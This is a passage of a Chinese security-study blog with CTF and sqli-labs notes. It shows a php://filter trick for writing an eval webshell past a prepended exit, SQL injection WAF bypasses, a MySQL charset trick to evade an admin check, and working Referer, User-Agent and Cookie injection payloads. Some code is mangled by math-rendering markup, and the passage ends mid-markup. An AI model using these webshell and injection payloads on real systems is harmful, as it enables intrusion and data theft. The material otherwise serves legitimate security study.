时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当 $content 被加上了 <code>&lt;?php exit; ?&gt;</code>  以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。由于该语句中只有 phpexit 符合 base64 解码特性，因此其余的符号会被忽略。</p>\n<p>“phpexit” 一共 7 个字符，因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个 “a” 一共 8 个字符。后面在拼接我们一句话木马的 base64 编码格式。这样在解码的时候 phpexita 会被解码为无用字符，我们的一句话木马被正常解码</p>\n<p>因此我们最终传入的 payload 为：</p>\n<p><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/read=convert.base64-decode/resource=aaa.php</code></p>\n<p>在 filename 解码时，a 和 phpexit 变为了乱码，我们的 eval ($_POST [1]) 最终留了下来</p>\n<p>0x01 利用字符串操作</p>\n<p><code>&lt;?php exit; ?&gt;</code>  实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>利用如下 payload，我们便能去除 &lt;&gt; 中的内容  <code>php://filter/read=string.strip_tags/resource=php://input</code></p>\n<p>但问题在于，如果我们去除 &lt;&gt; 会导致我们的一句话木马也被去除。</p>\n<p>但 php://filter 允许使用多个过滤器，我们可以先将 webshell 用 base64 编码。在调用完成 strip_tags 后再进行 base64-decode。</p>\n<p>最终 payload 如下</p>\n<p><code>txt=PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/write=string.strip_tags | convert.base64-decode/resource=aaa.php</code></p>\n<p>filename 中的 string.strip_tags 先把 exit 的 &lt;&gt; 去除，在把我们提交的 base64 编码解码，最终只剩下 <code>&lt;?php eval($_POST[1];?)</code></p>\n<h5 id=\"带有waf过滤的sql注入\"><a class=\"markdownIt-Anchor\" href=\"#带有waf过滤的sql注入\">#</a> 带有 WAF 过滤的 SQL 注入</h5>\n<p>1. 过滤 and、or</p>\n<p>在过滤一遍的场景下可以尝试双写，大小写  less25，26</p>\n<p>在使用 preg_replace 过滤时，只会替换一次，但使用正则表达式时会匹配多次。</p>\n<p>或者使用逻辑运算符，使用 || 代替 or，&amp;&amp; 代替 and，但需要对 &amp;&amp; 进行编码 %26%26，URLcode 不用对 || 编码</p>\n<p>2. 过滤空格</p>\n<p>使用 /**/ 多行注释代替  Less 26</p>\n<p>%0a,% a0,%0b 代替空格 (不同的操作系统，不同的环境代替空格的符号也不同，windows 使用 % A0，产生乱码，无法代替空格，使用 %0a,linux 使用 % a0,%0b)</p>\n<p>使用 () 将语句括起来代替空格 [[极客大挑战 2019] HardSQL.zip](buu [极客大挑战 2019] HardSQL.zip)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username=admin&amp;password=444%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27)),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n<p>3. 过滤注释</p>\n<p>如果用单引号闭合，使用 and’1’='1 代替注释</p>\n<p>使用；%00 截断</p>\n<p>4.union select 过滤</p>\n<p>uniunion selecton select</p>\n<p>5. 过滤 =</p>\n<p>like</p>\n<p>regexp</p>\n<p>6.0x 通过 16 进制逃过</p>\n<h5 id=\"通过编码注入\"><a class=\"markdownIt-Anchor\" href=\"#通过编码注入\">#</a> 通过编码注入</h5>\n<ol>\n<li></li>\n</ol>\n<p>一些 mysql 不认识，但 php 认识的字符，只限制于 post</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_select_db</span>(<span class=\"string\">&#x27;adog&#x27;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;set names utf8&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$ps</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;select * from users where id=&#x27;<span class=\"subst\">$id</span>&#x27; and ps=&#x27;<span class=\"subst\">$ps</span>&#x27;&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$id</span> == <span class=\"string\">&#x27;adog&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;shabi&quot;</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">flag</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;wrong&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_select_db</span>(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"string\">&quot;set names utf-8&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"number\">256</span>;<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">chr</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"string\">&quot;hehe&quot;</span>.<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `demo` where `name`=`<span class=\"subst\">&#123;$name&#125;</span>`&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;name&#x27;</span>] == <span class=\"string\">&quot;hehe&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">&#123;$c&#125;</span> &lt;br/&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>通过上述脚本，我么可以查到一些 latin1 的单词，来绕过，比如 <code>Å</code></p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>一些通过 get 提交，mysql 不认识，但 php 认识的字符，限制于 get</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$username</span> === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class=\"string\">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Permission denied!&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;SELECT * FROM z_users where username = &#x27;<span class=\"subst\">&#123;$username&#125;</span>&#x27; and password = &#x27;<span class=\"subst\">&#123;$password&#125;</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>大概内容就是 username=admin 时会直接 die，不是 admin 但又查不出东西</p>\n<p>mysql 默认字符集为 latin1，根本原因为 mysql 字符集和 mysqli 客户端字符集不同。我们通过语句 <code>mysql_query(&quot;set names utf-8&quot;);</code>  , <code>set names utf8</code>  的意思是将客户端的字符集设置为 utf8。mysql 有如下几种 charset</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like &quot;%character%&quot;;</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| Variable_name            | Value                                    |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| character_set_client     | utf8                                     |</span><br><span class=\"line\">| character_set_connection | utf8                                     |</span><br><span class=\"line\">| character_set_database   | gbk                                      |</span><br><span class=\"line\">| character_set_filesystem | binary                                   |</span><br><span class=\"line\">| character_set_results    | utf8                                     |</span><br><span class=\"line\">| character_set_server     | utf8                                     |</span><br><span class=\"line\">| character_set_system     | utf8                                     |</span><br><span class=\"line\">| character_sets_dir       | D:\\BtSoft\\mysql\\MySQL5.5\\share\\charsets\\ |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">8 rows in set (0.04 sec)</span><br></pre></td></tr></table></figure>\n<p>在默认情况下，mysql 字符集为 latin1，而执行了 <code>set names utf8;</code>  以后， <code>character_set_client</code> 、 <code>character_set_connection</code> 、 <code>character_set_results</code>  等与客户端相关的配置字符集都变成了 utf8，但 <code>character_set_database</code> 、 <code>character_set_server</code>  等服务端相关的字符集还是 latin1。</p>\n<p>因为这一条语句，导致客户端、服务端的字符集出现了差别。既然有差别，Mysql 在执行查询的时候，就涉及到字符集的转换。</p>\n<ol>\n<li>MySQL Server 收到请求时将请求数据从 character_set_client 转换为 character_set_connection；</li>\n<li>进行内部操作前将请求数据从 character_set_connection 转换为内部操作字符集</li>\n</ol>\n<p><code>character_set_client</code>  和 <code>character_set_connection</code>  被设置成了 utf8，而 <code>内部操作字符集</code> 其实也就是 <code>username</code>  字段的字符集还是默认的 latin1。于是，整个操作就有如下字符串转换过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure>\n<p>最后执行比较 <code>username='admin'</code>  的时候， <code>'admin'</code>  是一个 latin1 字符串。</p>\n<p>因此对于以下 url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:9090/test.php?username=admin%e4</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd%ac</span><br></pre></td></tr></table></figure>\n<p>前两个可以正常查询，但最后一个会产生错误，并且 url 中从 <code>%e4%bd%ac</code>  变为了 <code>佬</code></p>\n<p>在输入 % e4,% e4% bd 时，因为 utf8 是三个字节，他不认识这个两个字节和一个字节的玩意，自动忽略，扔给 latin1 时还是 admin，因此服务端正常查询</p>\n<p>一但 % e4% bd% ac 输入完整后，这三个字节拼成了佬，现在 utf8 认识了，传给服务端的时候变成了 admin 佬，现在 latin1 不认识了，开始报错</p>\n<p>这就是这三个前两个可以正常查询，但第三个报错的原因</p>\n<p>继续查询，我们发现只有部分字符可以正常查询出结果，但有些不能</p>\n<p>比如 admin% c2 可以，但 admin% c1 就不行，经过师傅的测试，有如下结果</p>\n<blockquote>\n<ol>\n<li>\\x00 <code>~</code> \\x7F`： 返回空白结果</li>\n<li><code>\\x80</code> ~ <code>\\xC1</code> ： 返回错误 Illegal mix of collations</li>\n<li><code>\\xC2</code> ~ <code>\\xEF</code> ： 返回 admin 的结果</li>\n<li><code>\\xF0</code> ~ <code>\\xFF</code> ： 返回错误 Illegal mix of collations</li>\n</ol>\n</blockquote>\n<p>UTF-8 编码是变长编码，可能有 1~4 个字节表示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022172222480.png\" alt=\"image-20221022172222480\"></p>\n<p>然后根据 RFC 3629 规范，又有一些字节值是不允许出现在 UTF-8 编码中的：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/db28c7b4-4dc9-4592-9fc7-23f0290c3892.6e734d61aa73.jpg\" alt=\"14917445720884.jpg\"></p>\n<p>所以最终，UTF-8 第一字节的取值范围是：00-7F、C2-F4，这也是我在 admin 后面加上 80-C1、F5-FF 等字符时会抛出错误的原因。</p>\n<p>那么，为什么 <code>username=admin%F0</code>  也不行呢？F0 是在 C2-F4 的范围中呀？</p>\n<p>这又涉及到 Mysql 中另一个特性：<strong>Mysql 的 utf8 其实是阉割版 utf-8 编码，Mysql 中的 utf8 字符集最长只支持三个字节</strong>，</p>\n<p>F0-F4 是四字节才有的，所以我传入 <code>username=admin%F0</code>  也将抛出错误。</p>\n<p>如果你需要 Mysql 支持四字节的 utf-8，可以使用 <code>utf8mb4</code>  编码。我将原始代码中的 set names 改成 <code>set names utf8mb4</code> ，就可以正常查询了</p>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对于php和mysql之间的编码问题，post和get方法是不一样的，post不用URL编码，可以直接用latin文字绕过</span><br><span class=\"line\">get需要利用到mysql字符集之间的转换，同时还要对utf8的字节范围熟悉，这样在utf8-utf9-latin1时就可以利用编码转换逃逸了</span><br><span class=\"line\">同时注意mysql的utf8是三个字节的，要是想用f0-f4需要把编码变为utf8mb4</span><br><span class=\"line\">utf8mb4是个好东西，还能防宽字节，下面会有详细描述</span><br></pre></td></tr></table></figure>\n<p>参考 p 师傅博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20=\">https://www.leavesongs.com</span></p>\n<h5 id=\"referer注入\"><a class=\"markdownIt-Anchor\" href=\"#referer注入\">#</a> referer 注入</h5>\n<p>通过 referer 字段不严格的过滤产生注入</p>\n<p>phpcmsv9 存在 referer 注入</p>\n<p>sqllab pass-19</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175006708.png\" alt=\"image-20220311175006708\"></p>\n<p>通过闭合确定 referer 存在注入</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>构造如下 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1),&#x27;127.0.0.100&#x27;)#</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>注意题目源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class=\"line\">闭合时需要在闭合一个括号</span><br></pre></td></tr></table></figure>\n<h5 id=\"user-agent注入\"><a class=\"markdownIt-Anchor\" href=\"#user-agent注入\">#</a> user-agent 注入</h5>\n<p>参考 sqllab 第 18 关</p>\n<p>1. 关于 sql 参数过滤，check_input 用于检查输入的内容。</p>\n<p>第二个 if 判断魔术开关是否打开，如果打开，则去除转义字符。魔术开关用于给特定的字符加转义字符</p>\n<p>如果没有开魔术开关，则使用 mysql_real_escape_string 转义特殊字符。如果不写<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>s</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">value = stripslashes(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span></span></span></span>value); 会导致由于魔术开关增加一次转义字符，mysql_real_escape_string 又会增加一次转义字符，双重转义导致转义失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_input($value)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tif(!empty($value))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t// truncation (see comments)</span><br><span class=\"line\">\t\t$value = substr($value,0,20);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Stripslashes if magic quotes enabled</span><br><span class=\"line\">\t\tif (get_magic_quotes_gpc())</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = stripslashes($value);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Quote if not a number</span><br><span class=\"line\">\t\tif (!ctype_digit($value))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t$value = intval($value);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\treturn $value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据代码审计，这关必须建立在用户名和密码正确的基础上，输入正确的 username 和 password 之后抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数据库中接收参数的语句为 </span><br><span class=\"line\">\t$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class=\"line\">\t$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311173048631.png\" alt=\"image-20220311173048631\"></p>\n<p>0. 数据库中闭合语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>\n<p>最终 payload 有两种形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1),&#x27;127.0.0.1&#x27;,&#x27;sb&#x27;)#</span><br><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">//注意不能直接使用#注释，否则会产生括号不匹配，要是用#必须手动加后半个括号补齐</span><br><span class=\"line\">//但加如)后会导致列数不匹配,后面还需要补充两列</span><br></pre></td></tr></table></figure>\n<p>也可以使用 sqlmap 注入，但要注意默认的等级 level1 是不对 uagent 检测的</p>\n<h5 id=\"cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#cookie注入\">#</a> cookie 注入</h5>\n<p>通过没有过滤 cookie 字段的值产生的 cookie 注入</p>\n<p>sqllab pass-20，21，22</p>\n<p>注意在抓包时需要先和服务器进行一次交互，使得服务器返回 cookie。只有提交正确的用户名和密码才能到 if 中 setcookie</p>\n<p>后续在第二个包中注入，没有设置 submit 时会进第二个 if 走 select 查询</p>\n<p>验证存在注入：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175929845.png\" alt=\"image-20220311175929845\"></p>\n<p>进行注入：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311180121906.png\" alt=\"image-20220311180121906\"></p>\n<p>最终构造的 paylaod 为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>不加 <code>)</code>  的原因是他的查询语句长这样：</p>\n<p>​      <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>q</mi><mi>l</mi><mo>=</mo><mi mathvariant=\"normal\">&quot;</mi><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mo>∗</mo><mi>F</mi><mi>R</mi><mi>O</mi><mi>M</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>W</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup></mrow><annotation encoding=\"application/x-tex\">sql=&quot;SELECT * FROM users WHERE username=&#x27;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">s</span><span 